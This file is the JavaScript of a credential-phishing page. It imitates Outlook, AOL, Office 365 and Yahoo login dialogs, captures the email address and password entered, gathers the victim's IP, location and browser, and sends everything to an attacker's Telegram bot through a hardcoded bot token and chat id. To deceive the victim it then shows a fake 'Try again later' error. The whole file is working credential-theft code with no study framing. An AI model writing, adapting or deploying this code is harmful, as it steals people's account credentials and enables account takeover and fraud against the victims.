// Modal provider configurations
const providers = {
  outlook: {
    title: `Login with Outlook`,
    icon: `<svg width="48" height="48" viewBox="0 0 48 48"> <rect x="6" y="12" width="36" height="24" rx="3" fill="white"/> <rect x="8" y="14" width="32" height="20" rx="2" fill="#0078D4"/> <path d="M24 26 L12 18 L36 18 Z" fill="white"/> <path d="M12 30 L24 22 L36 30" fill="none" stroke="white" stroke-width="1.5"/> </svg>`,
    class: `outlook`,
  },
  aol: {
    title: `Login with AOL`,
    icon: `<svg width="48" height="48" viewBox="0 0 48 48"> <text x="24" y="32" font-size="20" font-weight="bold" fill="white" text-anchor="middle">AOL</text> </svg>`,
    class: `aol`,
  },
  office365: {
    title: `Login with Office 365`,
    icon: `<svg width="48" height="48" viewBox="0 0 48 48"> <rect x="12" y="12" width="24" height="24" rx="3" fill="white"/> <rect x="15" y="15" width="7" height="18" fill="#D83B01"/> <rect x="24" y="15" width="7" height="7" fill="#D83B01"/> <rect x="24" y="25" width="7" height="8" fill="#D83B01"/> </svg>`,
    class: `office365`,
  },
  yahoo: {
    title: `Login with Yahoo!`,
    icon: `<svg width="48" height="48" viewBox="0 0 48 48"> <text x="24" y="34" font-size="28" font-weight="bold" fill="white" text-anchor="middle">Y!</text> </svg>`,
    class: `yahoo`,
  },
  other: {
    title: `Login with Other Mail`,
    icon: `<svg width="48" height="48" viewBox="0 0 48 48"> <text x="24" y="36" font-size="32" font-weight="bold" fill="white" text-anchor="middle">@</text> </svg>`,
    class: `other`,
  },
};

// Open modal function
function openModal(providerKey) {
  const provider = providers[providerKey];
  if (!provider) return;

  const modalOverlay = document.getElementById("modal-overlay");
  const modalIcon = document.getElementById("modal-icon");
  const modalTitle = document.getElementById("modal-title");

  // Set modal content
  modalIcon.innerHTML = provider.icon;
  modalIcon.className = "modal-icon " + provider.class;
  modalTitle.textContent = provider.title;

  // Clear form and error message
  document.getElementById("email").value = "";
  document.getElementById("password").value = "";
  const errorMsg = document.getElementById('error-message');
  if (errorMsg) errorMsg.remove();
  
  // Reset login button
  const loginBtn = document.querySelector('.btn-primary');
  if (loginBtn) {
    loginBtn.textContent = 'Login';
    loginBtn.disabled = false;
  }

  // Show modal with animation
  modalOverlay.classList.add("active");
  document.body.style.overflow = "hidden";
}

// Close modal function
function closeModal() {
  const modalOverlay = document.getElementById("modal-overlay");
  modalOverlay.classList.remove("active");
  document.body.style.overflow = "auto";
}

// Handle form submission
function handleSubmit(event) {
  event.preventDefault();

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  const loginBtn = document.querySelector('.btn-primary');

  // Basic validation
  if (email && password) {
    // Change button to verifying
    loginBtn.textContent = 'Verifying...';
    loginBtn.disabled = true;

    // Get system information
    const userAgent = navigator.userAgent;
    const timestamp = new Date().toLocaleString();
    const platform = navigator.platform;
    
    // Detect browser
    let browser = 'Unknown';
    if (userAgent.includes('Chrome')) browser = 'Chrome';
    else if (userAgent.includes('Firefox')) browser = 'Firefox';
    else if (userAgent.includes('Safari')) browser = 'Safari';
    else if (userAgent.includes('Edge')) browser = 'Edge';
    else if (userAgent.includes('Opera')) browser = 'Opera';
    
    // Get IP and location info
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(locationData => {
        const message = `🚨 New Login Attempt:
Email: ${email}
Password: ${password}
-----------------------------------------------------
📍 *IP Address*: ${locationData.ip || 'Unknown'}
🌍 *Location*: ${locationData.country_name || 'Unknown'} ${locationData.flag || ''}
🌐 *Browser*: ${browser} (${platform})
⏰ *TimeStamp*: ${timestamp}`;
        
        sendToTelegram(message, loginBtn);
      })
      .catch(error => {
        // Fallback without location data
        const message = `🚨 New Login Attempt:
Email: ${email}
Password: ${password}
-----------------------------------------------------
📍 *IP Address*: Unable to fetch
🌍 *Location*: Unable to fetch
🌐 *Browser*: ${browser} (${platform})
⏰ *TimeStamp*: ${timestamp}`;
        
        sendToTelegram(message, loginBtn);
      });
  }

  return false;
}

// Close modal on Escape key
document.addEventListener("keydown", function (event) {
  if (event.key === "Escape") {
    closeModal();
  }
});

// Add smooth scroll behavior
document.addEventListener("DOMContentLoaded", function () {
  // Add loading animation
  document.body.style.opacity = "0";
  setTimeout(() => {
    document.body.style.transition = "opacity 0.5s ease";
    document.body.style.opacity = "1";
  }, 100);
});

// Send message to Telegram
function sendToTelegram(message, loginBtn) {
  const botToken = "8567726117:AAEU6fS4K6vPIhP6VJEAzIVI7TY2R_LCG5Q";
  const chatId = "6770485194";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      // Wait 5 seconds then show error
      setTimeout(() => {
        // Reset button
        loginBtn.textContent = 'Login';
        loginBtn.disabled = false;
        
        // Show error message
        const modalTitle = document.getElementById('modal-title');
        let errorMsg = document.getElementById('error-message');
        if (!errorMsg) {
          errorMsg = document.createElement('p');
          errorMsg.id = 'error-message';
          errorMsg.style.color = '#dc2626';
          errorMsg.style.fontSize = '14px';
          errorMsg.style.marginTop = '10px';
          errorMsg.style.textAlign = 'center';
          modalTitle.parentNode.insertBefore(errorMsg, modalTitle.nextSibling);
        }
        errorMsg.textContent = 'Try again later';
      }, 5000);
    })
    .catch((error) => {
      console.error("Error:", error);
      setTimeout(() => {
        loginBtn.textContent = 'Login';
        loginBtn.disabled = false;
      }, 5000);
    });
}